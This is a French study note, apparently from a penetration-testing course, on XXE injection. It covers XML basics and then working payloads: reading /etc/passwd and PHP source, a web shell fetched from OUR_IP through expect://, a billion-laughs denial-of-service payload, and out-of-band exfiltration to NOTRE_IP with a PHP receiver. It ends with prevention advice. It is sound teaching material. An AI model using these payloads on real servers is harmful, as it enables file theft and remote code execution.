# XXE

## <mark style="color:red;">**Introduction à XXE**</mark>

Les vulnérabilités d'**injection d'entités externes XML (XXE)** se produisent lorsque <mark style="color:orange;">**des données XML sont prises à partir d'une entrée contrôlée par l'utilisateur sans être correctement assainies ou analysées en toute sécurité**</mark>,

### <mark style="color:blue;">**XML**</mark>

Le **Extensible Markup Language (XML)** Langage de balisage pour **stocker et transférer des données**, structuré en **arbres d’éléments** avec un **élément racine** et des **éléments enfants**, contrairement à HTML, il n’est pas fait pour l’affichage.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Clé</strong></td><td><strong>Définition</strong></td><td><strong>Exemple</strong></td></tr><tr><td>Balise</td><td>Les clés d'un document XML, généralement enveloppées avec les caractères (&#x3C;/>)</td><td><code>&#x3C;date></code></td></tr><tr><td>Entité</td><td>Variables XML, généralement enveloppées avec les caractères (&#x26;/;)</td><td><code>&#x26;lt;</code></td></tr><tr><td>Élément</td><td>L'élément racine ou l'un de ses éléments enfants, et sa valeur est stockée entre une balise d'ouverture et de fermeture</td><td><code>&#x3C;date>01-01-2022&#x3C;/date></code></td></tr><tr><td>Attribut</td><td>Spécifications optionnelles pour tout élément, qui sont stockées dans les balises, et qui peuvent être utilisées par l'analyseur XML</td><td><code>version="1.0"/encoding="UTF-8"</code></td></tr><tr><td>Déclaration</td><td>Habituellement la première ligne d'un document XML, et définit la version XML et l'encodage à utiliser lors de l'analyse</td><td><code>&#x3C;?xml version="1.0" encoding="UTF-8"?></code></td></tr></tbody></table>

Certains caractères (`<`, `>`, `&`, `"`) doivent être **échappés** (`&lt;`, `&gt;`, `&amp;`, `&quot;`).\
Les **commentaires** s’écrivent entre `<!--` et `-->`

<mark style="color:green;">**DTD XML**</mark>

{% hint style="info" %}
La **Définition de Type de Document (DTD) XML** permet la validation d'un document XML par rapport à une structure de document pré-définie. La structure de document pré-définie peut être définie dans le document lui-même ou dans un fichier externe.
{% endhint %}

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

Comme nous pouvons le voir, le DTD déclare l'élément racine **email** avec la déclaration de type **ELEMENT** et indique ensuite ses éléments enfants. Ensuite, chaque élément enfant est également déclaré, certains ayant aussi des éléments enfants, tandis que d'autres ne contiennent que des données brutes (comme indiqué par **PCDATA**).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

OU

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

<mark style="color:green;">**Entités XML**</mark>

Nous pouvons également définir des entités personnalisées (c'est-à-dire des variables XML) dans les DTD XML, pour permettre la refactorisation des variables et réduire les données répétitives. Cela peut être fait en utilisant le mot-clé **ENTITY**, suivi du nom de l'entité et de sa valeur, comme suit :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Une fois que nous définissons une entité, elle peut être référencée dans un document XML entre un **&** et un **;** (par exemple, `&company;`). Chaque fois qu'une entité est référencée, elle sera remplacée par sa valeur par l'analyseur XML. Plus intéressant encore, nous pouvons référencer des **Entités XML Externes** avec le mot-clé **SYSTEM**, suivi du chemin de l'entité externe, comme suit :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

{% hint style="warning" %}
Note : Nous pouvons également utiliser le mot-clé **PUBLIC** au lieu de **SYSTEM** pour charger des ressources externes, ce qui est utilisé avec des entités et des normes publiquement déclarées, telles qu'un code de langue (**lang="en"**). Dans ce module, nous utiliserons **SYSTEM**, mais nous devrions pouvoir utiliser l'un ou l'autre dans la plupart des cas.

Cela fonctionne de manière similaire aux entités XML internes définies dans les documents. Lorsque nous référencions une entité externe (par exemple, `&signature;`), l'analyseur la remplacera par sa valeur stockée dans le fichier externe (par exemple, **signature.txt**). Lorsque le fichier XML est analysé côté serveur, dans des cas comme les API **SOAP** (XML) ou les formulaires web, une entité peut référencer un fichier stocké sur le serveur back-end, qui peut éventuellement être divulgué lorsque nous faisons référence à l'entité.
{% endhint %}

***

## <mark style="color:red;">Local File Disclosure</mark>

***

Si l’appli accepte du XML non filtré, on peut **définir des entités externes** pour lire des fichiers **sensibles côté serveur**.

***

### <mark style="color:blue;">Identifying</mark>

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg" alt=""><figcaption></figcaption></figure>

Capture

![xxe\_request](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

![xxe\_response](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)

Si un élément XML (ex. `<email>`) est affiché dans la réponse, on peut **injecter une entité personnalisée** dedans pour tester si elle est évaluée et récupérer des données.

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Si aucun DTD n’est présent, on peut en **ajouter un** pour définir une **entité** (ex. `&company;`) et l’injecter dans un élément XML pour tester si sa valeur est affichée.

![new\_entity](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)

{% hint style="success" %}
Certaines applications web peuvent par défaut utiliser un format JSON dans les requêtes HTTP, mais elles peuvent tout de même accepter d'autres formats, y compris XML. Ainsi, même si une application web envoie des requêtes au format JSON, nous pouvons essayer de modifier l'en-tête Content-Type en `application/xml`, puis convertir les données JSON en XML à l'aide d'un outil en ligne. Si l'application web accepte la requête avec des données XML, nous pouvons également tester cette requête contre des vulnérabilités XXE, ce qui pourrait révéler une vulnérabilité XXE inattendue.
{% endhint %}

***

### <mark style="color:blue;">Reading Sensitive Files</mark>

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

![external\_entity](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

***

### <mark style="color:blue;">Reading Source Code</mark>

![file\_php](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

Les fichiers non-XML ou binaires échouent comme entités externes. Avec PHP, on peut utiliser **`php://filter`** pour **encoder en base64** et éviter les problèmes de format XML.

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

![file\_php](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

***

### <mark style="color:blue;">Remote Code Execution with XXE</mark>

En plus de lire des fichiers locaux, XXE peut permettre **l’exécution de code**. Méthodes : utiliser des clés SSH, voler des hashes, ou `php://expect` sur PHP. Le plus fiable : **injecter un web shell** depuis notre serveur pour exécuter des commandes à distance.

```shell-session
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

Pour ne pas casser la syntaxe XML, remplacer les espaces par `$IFS` et éviter certains caractères (`|`, `>`, `{`). Si la requête réussit, on peut recevoir et interagir avec le **web shell** sur le serveur distant. Comme le module `expect` n’est pas toujours activé, XXE sert surtout à **lire des fichiers sensibles** et découvrir d’autres vulnérabilités.

***

### <mark style="color:blue;">Other XXE Attacks</mark>

Une autre attaque courante souvent réalisée par le biais de vulnérabilités XXE est l'exploitation de SSRF (Server-Side Request Forgery), qui est utilisée pour énumérer les ports ouverts localement et accéder à leurs pages, ainsi qu'à d'autres pages web restreintes, via la vulnérabilité XXE. Le module des attaques côté serveur couvre en détail SSRF, et les mêmes techniques peuvent être appliquées avec des attaques XXE.\
Enfin, un usage courant des attaques XXE est de provoquer une **Déni de Service (DOS)** au serveur web hébergeant l'application, en utilisant le **payload** suivant :

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

Ce payload définit l'entité a0 comme étant "DOS", la référence plusieurs fois dans a1, puis dans a2, et ainsi de suite, jusqu'à ce que la mémoire du serveur back-end soit épuisée à cause des boucles de références récursives. Cependant, cette attaque ne fonctionne plus avec les serveurs web modernes (par exemple, Apache), car ils se protègent contre les auto-références d'entités. Essayez cette attaque contre cet exercice pour voir si elle fonctionne.

***

## <mark style="color:red;">Advanced File Disclosure</mark>

***

### <mark style="color:blue;">Advanced Exfiltration with CDATA</mark>

Pour lire des fichiers **non-XML ou binaires** sans casser le format XML, on peut utiliser **CDATA** :

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
<email>&joined;</email>
```

* Ici, `&joined;` combine les entités pour créer un bloc CDATA contenant le fichier.
* Mais XML **bloque la jonction interne/externe**, donc ça ne fonctionne pas directement.

✅ Solution : **XML Parameter Entities** `%` dans le DTD, qui peuvent être combinées depuis une source externe :

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Puis dans le XML envoyé à la cible :

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
  %xxe;
]>
<email>&joined;</email>
```

* `%xxe;` inclut notre DTD externe hébergée.
* `&joined;` affiche le **contenu brut** du fichier `submitDetails.php` sans base64.

⚠️ Limites : certains fichiers modernes peuvent être bloqués par le serveur pour éviter les **boucles d’entités XML**.

💡 Astuce : cette technique est très utile quand les méthodes XXE classiques échouent ou avec d’autres frameworks web.

***

### <mark style="color:blue;">Error Based XXE</mark>**XXE “aveugle” avec erreurs**

Si l’application n’affiche **aucune sortie**, on ne peut pas lire directement les fichiers via XXE.

* Si elle affiche des **erreurs (ex. PHP)**, celles-ci peuvent révéler des infos sensibles comme les chemins du serveur.
* Sinon, on est en mode **totalement aveugle**.

**Test initial**

On peut provoquer des erreurs en envoyant du XML malformé :

* Supprimer une balise de fermeture.
* Modifier une balise (ex. `<roo>` au lieu de `<root>`).
* Référencer une entité inexistante.

**Exploitation via DTD externe**

1. Créer un fichier `xxe.dtd` avec une charge utile pour exploiter l’erreur :

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

* `%file` = fichier cible
* `%error` = combine `%file` avec une entité inexistante pour provoquer une erreur et afficher le contenu

2. Référencer le DTD et l’entité d’erreur dans le XML envoyé :

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://NOTRE_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

* L’application va générer une **erreur qui contient le contenu de `/etc/hosts`**.

**Remarques**

* On peut changer le fichier ciblé (ex. `submitDetails.php`) pour lire d’autres fichiers.
* Cette méthode est **moins fiable** que CDATA ou Parameter Entities : limitée par la taille des erreurs et certains caractères spéciaux.

***

## <mark style="color:red;">**Blind Data Exfiltration**</mark>

#### <mark style="color:green;">Exfiltration des Données Hors Bande (OOB)</mark>

Dans un scénario où l'application web ne renvoie aucune réponse affichant les entités XML, nous pouvons forcer l'application à envoyer une requête HTTP vers notre serveur contenant les données exfiltrées.

**Méthode avec une entité externe**

Nous définissons une entité SYSTEM pour lire le fichier cible et l'encoder en Base64 :

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://NOTRE_IP:8000/?content=%file;'>">
```

Ensuite, nous envoyons une requête XML malveillante à l'application web :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://NOTRE_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Nous décodons ensuite les données en Base64.

**Serveur de Réception des Données**

Nous créons un serveur PHP pour recevoir et décoder les données :

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Nous lançons ensuite le serveur :

```bash
php -S 0.0.0.0:8000
```

Les données du fichier exfiltré apparaissent dans notre terminal.

***

#### <mark style="color:green;">Exfiltration via DNS (OOB DNS)</mark>

Plutôt que d'utiliser HTTP, nous pouvons encoder les données dans un sous-domaine et capturer les requêtes DNS avec `tcpdump` :

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ENCODED_DATA.NOTRE_DOMAINE.com'>">
```

Puis, nous utilisons `tcpdump` pour capturer les requêtes :

```bash
tcpdump -i eth0 udp port 53
```

Nous analysons ensuite les sous-domaines pour extraire les données.

***

#### <mark style="color:green;">Automatisation avec XXEinjector</mark>

Nous pouvons utiliser **XXEinjector** pour automatiser cette attaque.

1. Clonons le dépôt :

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

2. Préparons une requête HTTP :

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

3. Exécutons XXEinjector :

{% code overflow="wrap" fullWidth="true" %}
```bash
ruby XXEinjector.rb --host=[NOTRE_IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
{% endcode %}

4. Récupérons les données exfiltrées dans `Logs/10.129.201.94/etc/passwd.log`.

***

{% hint style="warning" %}
#### <mark style="color:green;">**Prévention des attaques XXE (XML External Entity)**</mark>

Les vulnérabilités **XXE** surviennent principalement lorsqu'un XML non sécurisé fait référence à une entité externe, permettant d'accéder à des fichiers sensibles ou d'exécuter des actions malveillantes. Voici les principales méthodes de prévention :

**1. Mettre à jour les bibliothèques XML**

* Les vulnérabilités XXE sont souvent dues à des bibliothèques XML obsolètes.
* Exemple : **libxml\_disable\_entity\_loader** en PHP est obsolète depuis PHP 8.0 car il permet d'activer les entités externes de manière dangereuse.

**2. Utiliser des configurations XML sécurisées**

* **Désactiver les DTDs personnalisés** et les **entités XML externes**.
* **Désactiver le traitement des entités paramétrées** et le **support de XInclude**.
* **Empêcher les boucles de référence d'entités**.

**3. Éviter les formats basés sur XML**

* Privilégier **JSON ou YAML** à la place du XML.
* Éviter les **API SOAP** et favoriser **REST avec JSON**.

**4. Activer une gestion d’erreurs stricte**

* Ne pas afficher les erreurs XML détaillées sur le serveur.

**5. Utiliser un Web Application Firewall (WAF)**

* Bloque certaines attaques XXE, mais ne remplace pas une correction en profondeur.

📌 **Exemple de bonne pratique :** Une application utilisant XML pour traiter des SVG ou des PDF doit **désactiver les entités externes** et **mettre à jour ses bibliothèques** pour éviter l’exploitation d’une faille XXE.
{% endhint %}
